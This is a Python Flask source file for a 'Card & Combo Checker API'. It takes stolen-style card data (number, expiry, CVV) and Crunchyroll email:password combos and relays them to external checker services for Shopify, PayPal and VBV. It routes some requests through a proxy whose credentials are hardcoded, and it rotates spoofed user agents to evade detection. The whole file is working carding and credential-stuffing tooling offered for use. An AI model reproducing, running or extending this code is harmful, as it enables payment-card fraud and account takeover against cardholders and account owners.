from flask import Flask, request, jsonify
import requests, random, string, uuid, json, os, time, logging, re
from bs4 import BeautifulSoup

# ---- Logging ----
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("checker_api")

app = Flask(__name__)

# ---- User-Agent rotation ----
FALLBACK_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"
]

def generate_user_agent():
    try:
        from fake_useragent import UserAgent
        ua = UserAgent()
        candidate = getattr(ua, "random", None) or ua.chrome or ua.safari
        if candidate:
            return candidate
    except Exception:
        pass
    return random.choice(FALLBACK_UAS)

def build_headers(referer="https://wizvenex.com/", origin="https://wizvenex.com"):
    ua = generate_user_agent()
    return {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": referer,
        "Sec-CH-UA": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": ua,
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Origin": origin,
    }

def parse_status_line(html_line):
    line = html_line.strip()
    if not line:
        return None

    soup = BeautifulSoup(line, "html.parser")
    spans = soup.find_all("span")
    span_texts = [s.get_text(strip=True) for s in spans]
    plain = soup.get_text(" ", strip=True)

    primary = span_texts[0] if len(span_texts) >= 1 else None
    secondary = span_texts[1] if len(span_texts) >= 2 else None

    time_match = re.search(r"TIME(?:\s*TAKEN|\s*[:\(])[:\s]*\(?(\d+)\s*s\)?", plain, re.I)
    time_seconds = int(time_match.group(1)) if time_match else None

    if not primary:
        up = plain.upper()
        if "APPROVED" in up:
            primary = "APPROVED"
        elif "DECLINED" in up:
            primary = "DECLINED"
        elif "SPAM" in up:
            primary = "IP SPAM DETECTED"
        else:
            primary = plain.split("➔")[0].strip() if "➔" in plain else plain

    if not secondary and "➔" in plain:
        parts = [p.strip() for p in plain.split("➔")]
        if len(parts) >= 2:
            secondary = parts[1] if parts[1] != primary else (parts[2] if len(parts) >= 3 else None)

    return {
        "primary_status": primary,
        "secondary_message": secondary,
        "time_taken_seconds": time_seconds,
        "developer": "Sukhraj"
    }

def html_response_to_json(response_text):
    parts = re.split(r"<br\s*/?>", response_text, flags=re.IGNORECASE)
    parsed = []
    for p in parts:
        obj = parse_status_line(p)
        if obj:
            parsed.append(obj)
    return parsed

# ---- Helpers ----
def mask_card(card):
    return card[:6] + "*" * (len(card) - 10) + card[-4:] if len(card) >= 10 else "*" * len(card)

def get_status_emoji(response_time):
    if response_time < 1:
        return "💚 Online"
    elif response_time < 3:
        return "💛 Slow"
    else:
        return "🧡 Dead"

# ---- Home Page ----
START_TIME = time.time()

@app.route("/", methods=["GET"])
def home():
    uptime = time.time() - START_TIME
    hours, remainder = divmod(int(uptime), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"

    return (
        f"""
╔════════════════════════════════════════════════════════════╗
║               💳  Card & Combo Checker API                 ║
╠════════════════════════════════════════════════════════════╣
║ 👨‍💻  Developer : Sukhraj                                    ║
║ 🧾  Description:                                           ║
║     A clean API to check cards                             ║
║     and verify Crunchyroll combos via GET/POST requests.   ║
╠════════════════════════════════════════════════════════════╣
║ 📡  API Endpoints:                                         ║
║    • /api/v1/checker/cc/shopify    → Shopify CC checker    ║
║    • /api/v1/checker/cc/paypal     → PayPal CC Checker     ║
║    • /api/v1/checker/crunchyroll   → Crunchyroll combo chk ║
║    • /api/v1/checker/vbv   → Vbv CC Checker                ║
╠════════════════════════════════════════════════════════════╣
╠═════════════════════════════════════════════════════════════════════════════════════════════╣
║ 📡  Example:                                                                                ║
║    • /api/v1/checker/cc/shopify?cc=5169102569918774|09|2027|224     → Shopify CC checker    ║
║    • /api/v1/checker/cc/paypal?cc=5169102569918774|09|2027|224      → PayPal CC Checker     ║
║    • /api/v1/checker/crunchyroll?combo=user@email.com:pass123       → Crunchyroll combo chk ║
║    • /api/v1/checker/cc/vbv?cc=5169102569918774|09|2027|224         → VBV CC Checker        ║
╠═════════════════════════════════════════════════════════════════════════════════════════════╣
║ ⚙️  Version  : 1.0.0                                        ║
║ 🌐  Status   : ✅ Online & Healthy                          ║
║ 🕒  Uptime    : {uptime_str}                                ║
║ 💡  Note     : Use POST for secure or bulk requests.        ║
╚════════════════════════════════════════════════════════════╝
        """,
        200,
        {"Content-Type": "text/plain; charset=utf-8"},
    )

# ---- Shopify Checker (unchanged) ----
@app.route("/api/v1/checker/cc/shopify", methods=["POST", "GET"])
def checker_cc():
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc = data.get("cc")
        else:
            cc = request.args.get("cc")

        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        url = (
            "https://rockyysoon-fb0f.onrender.com/index.php"
            "?site=https://keyadream.com/"
            f"&cc={cc}"
            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
        )

        resp = requests.get(url, timeout=15)
        json_body = safe_get_json(resp.text)
        if json_body:
            return jsonify(json_body), 200

        return jsonify({
            "result": resp.text[:200],
        }), 200

    except Exception as e:
        logger.exception("Shopify checker failed")
        return jsonify({"error": str(e)}), 500

# ---- Crunchyroll Checker (unchanged) ----
@app.route("/api/v1/checker/crunchyroll", methods=["POST", "GET"])
def checker_crunchy():
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            combo = data.get("combo")
        else:
            combo = request.args.get("combo")

        if not combo:
            return jsonify({"error": "Missing 'combo' parameter"}), 400

        url = f"https://crunchy-ng.vercel.app/check?combo={combo}"
        resp = requests.get(url, timeout=15)

        json_body = safe_get_json(resp.text)
        if json_body:
            return jsonify(json_body), 200

        return jsonify({
            "result": resp.text[:200],
        }), 200

    except Exception as e:
        logger.exception("Crunchyroll checker failed")
        return jsonify({"error": str(e)}), 500

# ---- PayPal Checker (NEW) ----
@app.route("/api/v1/checker/cc/paypal", methods=["POST", "GET"])
def checker_paypal():
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc_input = data.get("cc")
        else:
            cc_input = request.args.get("cc")

        if not cc_input:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        parts = cc_input.split("|")
        if len(parts) < 4:
            return jsonify({"error": "Invalid format. Use: number|month|year|cvv"}), 400

        card, month, year, cvv = [x.strip() for x in parts]
        masked = card

        headers = build_headers()
        params = {"lista": cc_input}
        resp = requests.get("https://wizvenex.com/Paypal.php", params=params, headers=headers, timeout=20)

        parsed_list = html_response_to_json(resp.text)
        status_emoji = get_status_emoji(time.time() - start)

        if parsed_list:
            result = parsed_list[0]  # take first result
            result.update({
                "card": cc_input,
            })
            return jsonify(result), 200
        else:
            return jsonify({
                "error": "No valid response parsed",
                "raw_response": resp.text[:300]
            }), 200

    except Exception as e:
        logger.exception("PayPal checker failed")
        return jsonify({"error": str(e)}), 500

# ---- Helper for JSON parsing (used by Shopify/Crunchyroll) ----
# ---- VBV Checker (FIXED: unique function name) ----
@app.route("/api/v1/checker/cc/vbv", methods=["POST", "GET"])
def checker_vbv():  # ← Renamed to avoid conflict
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc_input = data.get("cc")
        else:
            cc_input = request.args.get("cc")

        if not cc_input:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        parts = [p.strip() for p in cc_input.split("|")]
        if len(parts) < 4:
            return jsonify({"error": "Invalid format. Use: number|month|year|cvv"}), 400


        headers = build_headers()
        params = {"lista": cc_input}
        resp = requests.get("https://wizvenex.com/Vbv.php", params=params, headers=headers, timeout=20)

        parsed_list = html_response_to_json(resp.text)

        if parsed_list:
            result = parsed_list[0]
            result.update({
                "card": cc_input
            })
            return jsonify(result), 200
        else:
            return jsonify({
                "error": "No valid response parsed",
                "raw_response": resp.text[:300]
            }), 200

    except Exception as e:
        logger.exception("VBV checker failed")
        return jsonify({"error": str(e)}), 500

# ---- Helper for JSON parsing ----
def safe_get_json(response_text):
    try:
        return json.loads(response_text.lstrip("\ufeff").strip())
    except Exception:
        return None
# ---- Run App ----
if __name__ == "__main__":
    app.run(debug=True)
